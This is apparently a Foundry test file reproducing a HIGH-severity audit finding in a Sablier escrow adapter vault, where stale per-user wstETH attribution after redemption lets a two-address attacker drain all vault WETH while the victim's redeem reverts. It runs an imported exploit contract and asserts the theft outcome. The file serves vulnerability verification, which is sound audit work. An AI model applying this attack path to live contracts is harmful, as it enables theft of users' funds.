// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./65582-adapter-vault-userwsteth-not-cleared-after-redemption-enabl.sol";

/*//////////////////////////////////////////////////////////////
    Sablier Bob Escrow — Adapter vault `_userWstETH` not cleared
    after redemption. Finding #65582 (Cyfrin, MrPotatoMagic) HIGH.

    Drives the synthetic Exploit and re-asserts the harm: attacker
    with two addresses drains the full vault WETH; victim's redeem
    reverts with shares still outstanding.
//////////////////////////////////////////////////////////////*/
contract Sablier65582Test is Test {
    Exploit exploit;

    function setUp() public {
        vm.warp(0x65b0a380);
        exploit = new Exploit();
    }

    /// @notice Control: after a single honest redeem, `_userWstETH` would
    ///         still be stale (the bug), but a lone redeemer without a
    ///         second address cannot compound — isolation of the dual-address
    ///         attack path. We only assert the payout math is proportional
    ///         for a single redeem when no transfer follows.
    function test_control_singleRedeemPaysProportionalShare() public {
        MockWETH weth = new MockWETH();
        SablierLidoAdapter adapter = new SablierLidoAdapter(weth);
        BobVaultShare share = new BobVaultShare();
        SablierBob bob = new SablierBob(weth, adapter, share);
        adapter.setSablierBob(address(bob));
        share.setSablierBob(address(bob));

        address a = address(0xA11CE);
        address c = address(0xC1C);
        weth.mint(a, 100 ether);
        weth.mint(c, 100 ether);

        vm.startPrank(a);
        weth.approve(address(bob), 100 ether);
        bob.enter(a, 100 ether);
        vm.stopPrank();

        vm.startPrank(c);
        weth.approve(address(bob), 100 ether);
        bob.enter(c, 100 ether);
        vm.stopPrank();

        bob.unstakeTokensViaAdapter(220 ether); // 200 + 20 yield

        vm.prank(a);
        // redeem is called as bob.redeem(user) — in our synthetic caller
        // can be anyone; user is the redeemer.
        bob.redeem(a);
        assertEq(weth.balanceOf(a), 110 ether);
        // Bug still present: attribution not cleared
        assertEq(adapter.getYieldBearingTokenBalanceFor(1, a), 100 ether);
    }

    /// @notice HARM: dual-address attacker drains the vault; victim left
    ///         with unredeemable shares and zero WETH remaining.
    function test_run_staleUserWstETH_fundTheft() public {
        exploit.run();

        MockWETH weth = exploit.weth();
        BobVaultShare share = exploit.share();
        SablierBob bob = exploit.bob();
        Party victim = exploit.victim();

        // Attacker A holds the entire vault WETH (330).
        assertEq(weth.balanceOf(address(exploit)), 330 ether);
        // Bob is empty; victim still has shares.
        assertEq(weth.balanceOf(address(bob)), 0);
        assertEq(share.balanceOf(address(victim)), 100 ether);

        // Victim redeem reverts.
        vm.expectRevert();
        bob.redeem(address(victim));
    }
}
